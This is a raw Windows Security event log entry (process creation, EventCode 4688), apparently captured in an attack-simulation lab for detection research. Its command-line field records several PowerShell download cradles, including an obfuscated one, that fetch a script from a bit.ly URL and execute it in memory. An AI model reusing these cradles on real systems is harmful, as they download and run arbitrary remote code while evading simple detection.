02/11/2022 06:11:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-mhaag-attack-range-304.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=308456
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0xCD740

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1b04
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0xa10
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))} 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
